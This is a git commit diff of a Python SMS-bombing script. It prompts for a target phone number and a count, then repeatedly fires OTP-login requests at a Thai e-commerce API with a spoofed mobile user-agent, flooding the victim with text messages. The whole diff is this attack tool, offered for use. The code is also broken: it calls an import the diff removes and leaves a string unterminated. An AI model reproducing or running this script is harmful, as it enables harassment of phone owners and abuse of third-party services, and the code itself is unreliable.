bdafaa196a27e2465c8bb2cd1eae283543d2cf3a
TeeGm00 <101323493+TeeGm00@users.noreply.github.com>
2022-03-10 17:58:15 +0700

    Add files via upload

--- sms.py
+++ sms.py
@@ -1,8 +1,8 @@
-
+import requests,json
+import random
 import os
 import time
 import threading
-from urllib import request
 from requests import get
 from re import search
 from requests import Session
@@ -10,11 +10,12 @@ from threading import Thread
 import colorama
 os.system("clear")
 print(" เครเด : ไม่เห็นค่า ไม่ว่ากัน ") 
-phone = input("𝚙𝚑𝚘𝚗𝚎 : ") 
-NUM = int(input("𝙽𝚞𝚖 : ")) 
+phone = input(" | 𝚙𝚑𝚘𝚗𝚎 : ") 
+print("")
+NUM = int(input(" | 𝙽𝚞𝚖 : "))
 
 def api1():
-	request.post("https://api.scg-id.com/api/otp/send_otp")
+	request.post("https://api.zaapi.co/api/store/auth/otp/login",json={"phoneNumber":f"+66{phone[1:]}","namespace":"zaapi-buyers"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36})
 	print("ยิงแล้ว")
 	
 for i in range(NUM): 
